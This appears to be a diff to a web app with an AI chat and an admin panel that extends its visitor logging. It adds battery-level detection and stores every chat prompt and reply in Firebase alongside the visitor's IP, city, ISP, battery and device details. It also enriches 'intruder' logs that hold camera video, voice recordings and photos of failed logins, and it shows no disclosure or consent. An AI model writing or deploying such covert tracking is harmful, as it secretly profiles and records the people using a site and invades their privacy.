@@ -116,26 +116,11 @@
             border: 1px solid rgba(255, 255, 255, 0.35);
             will-change: top, left, transform;
         }
-        .fi-1 {
-            border-color: #ff0055; box-shadow: 0 0 16px #ff0055;
-            animation: flyTag1 13s infinite alternate ease-in-out;
-        }
-        .fi-2 {
-            border-color: #00f2fe; box-shadow: 0 0 16px #00f2fe;
-            animation: flyTag2 15s infinite alternate ease-in-out;
-        }
-        .fi-3 {
-            border-color: #a855f7; box-shadow: 0 0 16px #a855f7;
-            animation: flyTag3 14s infinite alternate ease-in-out;
-        }
-        .fi-4 {
-            border-color: #00ff87; box-shadow: 0 0 16px #00ff87;
-            animation: flyTag4 16s infinite alternate ease-in-out;
-        }
-        .fi-5 {
-            border-color: #ffbe0b; box-shadow: 0 0 16px #ffbe0b;
-            animation: flyTag5 17s infinite alternate ease-in-out;
-        }
+        .fi-1 { border-color: #ff0055; box-shadow: 0 0 16px #ff0055; animation: flyTag1 13s infinite alternate ease-in-out; }
+        .fi-2 { border-color: #00f2fe; box-shadow: 0 0 16px #00f2fe; animation: flyTag2 15s infinite alternate ease-in-out; }
+        .fi-3 { border-color: #a855f7; box-shadow: 0 0 16px #a855f7; animation: flyTag3 14s infinite alternate ease-in-out; }
+        .fi-4 { border-color: #00ff87; box-shadow: 0 0 16px #00ff87; animation: flyTag4 16s infinite alternate ease-in-out; }
+        .fi-5 { border-color: #ffbe0b; box-shadow: 0 0 16px #ffbe0b; animation: flyTag5 17s infinite alternate ease-in-out; }
 
         @keyframes flyTag1 {
             0%   { top: 14%; left: 6%;  transform: scale(0.95) rotate(-8deg); }
@@ -1266,10 +1251,10 @@
             </div>
         </div>
 
-        <!-- SECURITY SECTION 2: AI CHAT & IP LOGS -->
+        <!-- SECURITY SECTION 2: AI CHAT, BATTERY, DEVICE & IP LOGS -->
         <div class="admin-sec-box" style="border-color:#a855f7;">
             <div class="mailbox-header">
-                <h4 style="color:#c084fc;">💬 AI Chat & Device IP Logs</h4>
+                <h4 style="color:#c084fc;">💬 AI Chat, Battery, Network & Device IP Logs</h4>
                 <button class="btn-sm btn-red" style="padding: 5px 10px; font-size: 11.5px; margin:0;" onclick="deleteAllAILogs()">🗑️ Delete All</button>
             </div>
             <div id="admin-ai-logs-list" style="max-height:280px; overflow-y:auto;">
@@ -1409,16 +1394,32 @@
         }, { passive: true });
 
         /* =========================================
-           B. DETAILED DEVICE, OS, CITY & ISP DETECTOR
+           B. DETAILED DEVICE, BATTERY %, OS, CITY & ISP DETECTOR
            ========================================= */
         window.visitorInfo = {
             ip: "Fetching...",
             cityRegion: "Unknown Location",
             isp: "Unknown Network",
             deviceModel: "Web Browser",
+            batteryLevel: "Not Supported",
             screenRes: `${window.screen.width}x${window.screen.height}`
         };
 
+        // 1. Detect Battery Percentage & Charging Status
+        if (navigator.getBattery) {
+            navigator.getBattery().then((bat) => {
+                const updateBat = () => {
+                    const pct = Math.round(bat.level * 100);
+                    const chg = bat.charging ? " ⚡ Charging" : "";
+                    window.visitorInfo.batteryLevel = `${pct}%${chg}`;
+                };
+                updateBat();
+                bat.addEventListener('levelchange', updateBat);
+                bat.addEventListener('chargingchange', updateBat);
+            }).catch(() => {});
+        }
+
+        // 2. Detect Exact Device Model & OS
         (async function detectExactDevice() {
             const ua = navigator.userAgent;
             let baseInfo = ua.includes("Android") ? "Android Mobile" :
@@ -1440,6 +1441,7 @@
             }
         })();
 
+        // 3. Detect IP, City/Region & Network ISP
         fetch("https://ipapi.co/json/")
             .then(r => r.json())
             .then(d => {
@@ -1782,7 +1784,7 @@
             let mediaTag = "";
             let titleTxt = "📸 Full Size Photo";
             if (type === 'video') {
-                mediaTag = `<video src="${srcUrl}" controls autoplay playsinline style="width:100%; max-height:64vh; border-radius:12px; background:#000; margin-bottom:10px;"></video>`;
+                mediaTag = `<video src="${srcUrl}" controls autoplay playsinline preload="auto" style="width:100%; max-height:64vh; border-radius:12px; background:#000; margin-bottom:10px;"></video>`;
                 titleTxt = "🎥 Full Size 30s Video";
             } else if (type === 'audio') {
                 mediaTag = `<div style="padding:20px; background:rgba(0,0,0,0.6); border-radius:12px; margin-bottom:10px;">
@@ -2217,7 +2219,6 @@ STRICT INTENT & BREVITY RULES:
                 return;
             }
 
-            // Release any background mic stream so Android Chrome SpeechRecognition gets exclusive mic access
             if (window.activeCamStream) {
                 window.activeCamStream.getAudioTracks().forEach(t => t.stop());
             }
@@ -2324,9 +2325,6 @@ STRICT INTENT & BREVITY RULES:
         let socialLinks = { instagram: "", facebook: "", twitter: "", whatsapp: "" };
         const MAX_DEVICE_CHALLENGES = 5;
 
-        /* =========================================
-           TOGGLE ADMIN VIDEO DELETE LIST (ON DEMAND)
-           ========================================= */
         window.toggleAdminVideoManager = function() {
             const box = document.getElementById('admin-video-manager-box');
             const btn = document.getElementById('toggle-admin-videos-btn');
@@ -2336,9 +2334,6 @@ STRICT INTENT & BREVITY RULES:
             btn.innerText = isHidden ? '✖ Hide Video List' : '🗑️ Delete Video List (Show All)';
         };
 
-        /* =========================================
-           PRE-LOAD ALL 3 API KEYS FROM FIREBASE
-           ========================================= */
         onValue(ref(db, 'secretConfig/geminiKeys'), (snapshot) => {
             const val = snapshot.val() || {};
             const list = [];
@@ -2390,21 +2385,24 @@ STRICT INTENT & BREVITY RULES:
         }
 
         /* =========================================
-           AI CHAT + IP LOGGING TO FIREBASE
+           AI CHAT + IP + BATTERY + NETWORK + DEVICE LOGGING
            ========================================= */
         window.logAIChatToFirebase = function(userPrompt, aiReply) {
             push(ref(db, 'aiChatLogs'), {
                 prompt: userPrompt,
                 reply: aiReply,
                 ip: window.visitorInfo?.ip || "Unknown IP",
-                device: `${window.visitorInfo?.deviceModel || 'Browser'} (${getDeviceTag()})`,
+                cityRegion: window.visitorInfo?.cityRegion || "Unknown Location",
+                isp: window.visitorInfo?.isp || "Unknown Network",
+                battery: window.visitorInfo?.batteryLevel || "Unknown",
+                device: `${window.visitorInfo?.deviceModel || 'Browser'} • Screen: ${window.visitorInfo?.screenRes || ''} (${getDeviceTag()})`,
                 time: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'short' }),
                 timestamp: Date.now()
             }).catch(() => {});
         };
 
         /* =========================================
-           3-TRY WRONG PASSWORD LOCK + 30s PHOTOS (1/SEC), 30s VIDEO & VOICE
+           3-TRY WRONG PASSWORD LOCK + 30s PHOTOS, 30s VIDEO & BATTERY LOG
            ========================================= */
         let failedAttempts = parseInt(localStorage.getItem('rax_admin_fails') || '0', 10);
         let lockUntil = parseInt(localStorage.getItem('rax_admin_lock_until') || '0', 10);
@@ -2427,6 +2425,8 @@ STRICT INTENT & BREVITY RULES:
                 photo: photoData,
                 hasAudio: window.streamHasAudio,
                 attemptedEmail: attemptedEmail || "Unknown",
+                failedCount: failedAttempts,
+                battery: window.visitorInfo?.batteryLevel || "Unknown",
                 ip: window.visitorInfo?.ip || "Unknown IP",
                 cityRegion: window.visitorInfo?.cityRegion || "Unknown Location",
                 isp: window.visitorInfo?.isp || "Unknown ISP",
@@ -2445,6 +2445,13 @@ STRICT INTENT & BREVITY RULES:
                 recCanvas.width = 320;
                 recCanvas.height = 240;
                 const rCtx = recCanvas.getContext('2d');
+
+                // Capture a cover poster frame so video is never a blank black box
+                let posterFrame = "";
+                if (vid.videoWidth > 0) {
+                    rCtx.drawImage(vid, 0, 0, recCanvas.width, recCanvas.height);
+                    posterFrame = recCanvas.toDataURL('image/jpeg', 0.65);
+                }
 
                 let drawActive = true;
                 const drawLoop = () => {
@@ -2486,8 +2493,11 @@ STRICT INTENT & BREVITY RULES:
                             push(ref(db, 'intruderLogs'), {
                                 type: 'video',
                                 video: base64Video,
+                                poster: posterFrame,
                                 hasAudio: hasAudio,
                                 attemptedEmail: attemptedEmail || "Unknown",
+                                failedCount: failedAttempts,
+                                battery: window.visitorInfo?.batteryLevel || "Unknown",
                                 ip: window.visitorInfo?.ip || "Unknown IP",
                                 cityRegion: window.visitorInfo?.cityRegion || "Unknown Location",
                                 isp: window.visitorInfo?.isp || "Unknown ISP",
@@ -2528,6 +2538,8 @@ STRICT INTENT & BREVITY RULES:
                                 type: 'audio',
                                 audio: base64Audio,
                                 attemptedEmail: attemptedEmail || "Unknown",
+                                failedCount: failedAttempts,
+                                battery: window.visitorInfo?.batteryLevel || "Unknown",
                                 ip: window.visitorInfo?.ip || "Unknown IP",
                                 cityRegion: window.visitorInfo?.cityRegion || "Unknown Location",
                                 isp: window.visitorInfo?.isp || "Unknown ISP",
@@ -2628,6 +2640,8 @@ STRICT INTENT & BREVITY RULES:
                 push(ref(db, 'intruderLogs'), {
                     type: 'info_only',
                     attemptedEmail: attemptedEmail || "Unknown",
+                    failedCount: failedAttempts,
+                    battery: window.visitorInfo?.batteryLevel || "Unknown",
                     ip: window.visitorInfo?.ip || "Unknown IP",
                     cityRegion: window.visitorInfo?.cityRegion || "Unknown Location",
                     isp: window.visitorInfo?.isp || "Unknown ISP",
@@ -2755,7 +2769,7 @@ STRICT INTENT & BREVITY RULES:
                                    : (item.photo || "");
                     const fileExt = (isVideo || isAudio) ? 'webm' : 'jpg';
                     const fileName = `RAX_Intruder_${key}.${fileExt}`;
-                    const metaSummary = `Email: ${escapeHTML(item.attemptedEmail || 'Unknown')} | IP: ${item.ip || 'Unknown'} | ${item.cityRegion || ''}`;
+                    const metaSummary = `Email: ${escapeHTML(item.attemptedEmail || 'Unknown')} | Battery: ${item.battery || 'N/A'} | IP: ${item.ip || 'Unknown'} | ${item.cityRegion || ''}`;
 
                     if (!isInfoOnly && mediaSrc) {
                         window.intruderMediaCache[key] = {
@@ -2768,8 +2782,9 @@ STRICT INTENT & BREVITY RULES:
 
                     let mediaHTML = "";
                     if (isVideo) {
+                        const posterAttr = item.poster ? `poster="${item.poster}"` : "";
                         mediaHTML = `<div class="intruder-media-box" onclick="openIntruderItemFull('${key}')">
-                               <video src="${mediaSrc}" muted playsinline preload="metadata"></video>
+                               <video src="${mediaSrc}" ${posterAttr} muted playsinline preload="auto"></video>
                                <span class="tap-fullscreen-tag">▶️ Tap Full Size</span>
                            </div>`;
                     } else if (isAudio) {
@@ -2790,7 +2805,7 @@ STRICT INTENT & BREVITY RULES:
                         : isAudio
                         ? `<span class="intruder-badge badge-aud">🎙️ 30s Voice Recording</span><br>`
                         : isInfoOnly
-                        ? `<span class="intruder-badge badge-vid">⚠️ Device & IP Log</span><br>`
+                        ? `<span class="intruder-badge badge-vid">⚠️ Failed Login (${item.failedCount || 3} Tries)</span><br>`
                         : `<span class="intruder-badge badge-img">📸 Selfie Photo</span><br>`;
 
                     const dlBtnHTML = (!isInfoOnly && mediaSrc)
@@ -2802,8 +2817,9 @@ STRICT INTENT & BREVITY RULES:
                         <div class="intruder-meta">
                             ${badgeHTML}
                             <strong style="color:#00f2fe;">✉️ Entered Email: ${escapeHTML(item.attemptedEmail || 'Unknown')}</strong><br>
+                            <strong style="color:#00ff87;">🔋 Battery: ${escapeHTML(item.battery || 'Unknown')}</strong><br>
                             <strong style="color:#ffbe0b;">🌐 IP: ${item.ip || 'Unknown'}</strong><br>
-                            <span style="color:#00ff87;">📍 Location: ${escapeHTML(item.cityRegion || 'Unknown')}</span><br>
+                            <span style="color:#38bdf8;">📍 Location: ${escapeHTML(item.cityRegion || 'Unknown')}</span><br>
                             <span>📡 Network: ${escapeHTML(item.isp || 'Unknown')}</span><br>
                             <span>📱 Device: ${escapeHTML(item.device || 'Device')}</span><br>
                             <span style="color:#94a3b8;">🕒 ${item.time || ''}</span><br>
@@ -2832,11 +2848,13 @@ STRICT INTENT & BREVITY RULES:
                     div.className = 'mail-card';
                     div.style.borderLeftColor = '#a855f7';
                     div.innerHTML = `
-                        <div style="text-align:left; font-size:12.5px;">
-                            <div style="color:#00f2fe; font-weight:bold;">🌐 IP: ${item.ip || 'Unknown'} • 📱 ${item.device || ''}</div>
-                            <div style="color:#ffbe0b; margin-top:3px;"><strong>Q:</strong> ${escapeHTML(item.prompt || '')}</div>
+                        <div style="text-align:left; font-size:12px; line-height:1.45;">
+                            <div style="color:#00f2fe; font-weight:bold;">🌐 IP: ${item.ip || 'Unknown'} • 🔋 Battery: ${escapeHTML(item.battery || 'N/A')}</div>
+                            <div style="color:#00ff87;">📍 ${escapeHTML(item.cityRegion || 'Unknown')} • 📡 ${escapeHTML(item.isp || 'Unknown')}</div>
+                            <div style="color:#cbd5e1;">📱 ${escapeHTML(item.device || '')}</div>
+                            <div style="color:#ffbe0b; margin-top:4px;"><strong>Q:</strong> ${escapeHTML(item.prompt || '')}</div>
                             <div style="color:#e2e8f0; margin-top:2px;"><strong>AI:</strong> ${escapeHTML(item.reply || '')}</div>
-                            <small style="color:#94a3b8; font-size:10.5px;">${item.time || ''}</small>
+                            <small style="color:#94a3b8; font-size:10.5px;">🕒 ${item.time || ''}</small>
                         </div>
                         <div class="mail-actions">
                             <button class="btn-sm btn-red" style="padding:5px 8px; font-size:11px; margin:0;" onclick="deleteSingleAILog('${key}')">🗑️</button>
